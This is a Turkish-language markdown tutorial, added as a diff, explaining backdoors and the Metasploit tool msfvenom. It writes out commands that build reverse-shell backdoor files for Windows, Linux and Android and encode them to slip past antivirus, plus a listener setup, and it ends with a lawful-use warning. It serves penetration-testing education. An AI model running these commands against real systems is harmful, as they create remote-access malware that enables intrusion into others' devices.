@@ -1,0 +1,107 @@
+# 💀 Backdoor Nedir? ve `msfvenom` Kullanımı
+
+## 📌 Backdoor (Arka Kapı) Nedir?
+
+**Backdoor**, bir sistemde izinsiz veya gizli bir şekilde erişim elde etmeyi sağlayan arka kapıdır. Saldırganlar genellikle:
+
+- Sisteme sızdıktan sonra kalıcı erişim sağlamak,
+- Güvenlik önlemlerini atlatmak,
+- İzlerini gizlemek
+
+amacıyla backdoor yazılımlarını yerleştirirler.
+
+### 🔐 Backdoor Özellikleri
+
+- Gizli çalışır, antivirüslerden saklanmaya çalışır.
+- Sistemi kontrol etmek için kullanılabilir.
+- Kalıcılık sağlayarak sistem her açıldığında yeniden çalışabilir.
+- Çoğunlukla reverse shell, bind shell, trojan veya RAT (Remote Access Trojan) türündedir.
+
+---
+
+## 🛠️ `msfvenom` Nedir?
+
+**msfvenom**, Metasploit Framework içerisinde bulunan bir payload (zararlı kod) oluşturma aracıdır. Zararlı yazılım üretip hedefe göndermek için kullanılır.
+
+### 📦 Özellikleri:
+
+- Farklı platformlar için payload üretme (Windows, Linux, Android vs.)
+- Çeşitli formatlarda çıktı oluşturma (exe, apk, elf, dll, bash script vs.)
+- Encoding/obfuscation ile tespit edilmesini zorlaştırma
+- Payload'a ağ ayarları, port gibi parametreler ekleyebilme
+
+---
+
+## 🔧 `msfvenom` Kullanımı
+
+### ✅ Temel Syntax:
+
+```bash
+msfvenom -p <payload> LHOST=<saldırgan_ip> LPORT=<port> -f <format> -o <çıktı_dosyası>
+```
+
+### 📌 Örnek 1: Windows için Reverse Shell Payload (.exe)
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o backdoor.exe
+```
+
+| Parametre | Açıklama |
+|-----------|----------|
+| `-p` | Payload tipi |
+| `LHOST` | Saldırganın IP adresi |
+| `LPORT` | Saldırganın dinlediği port |
+| `-f` | Çıktı formatı (exe, elf, raw, etc.) |
+| `-o` | Çıktı dosya adı |
+
+### 📌 Örnek 2: Linux için Reverse Shell Payload (.elf)
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o backdoor.elf
+```
+
+### 📌 Örnek 3: Android için Backdoor (.apk)
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk
+```
+
+---
+
+## 🔄 Encoding (Şifreleme) ile Antivirüslerden Kaçınma
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o encoded_backdoor.exe
+```
+
+| Parametre | Açıklama |
+|-----------|----------|
+| `-e` | Encoder (örnek: x86/shikata_ga_nai) |
+| `-i` | Encode tekrar sayısı |
+
+---
+
+## 📡 Metasploit ile Listener Kurma
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+```
+
+---
+
+## ⚠️ Uyarı
+
+**msfvenom ve benzeri araçlar yalnızca izinli ortamlarda, eğitim veya sızma testi (pentest) amaçlı kullanılmalıdır.** İzinsiz kullanımı yasadışı olabilir.
+
+---
+
+## 🚀 Sonuç
+
+- `msfvenom`, Metasploit'in güçlü bir payload oluşturucusudur.
+- Farklı sistemler için özelleştirilmiş backdoor’lar üretilebilir.
+- Listener kurarak hedef sistem ile bağlantı sağlanabilir.
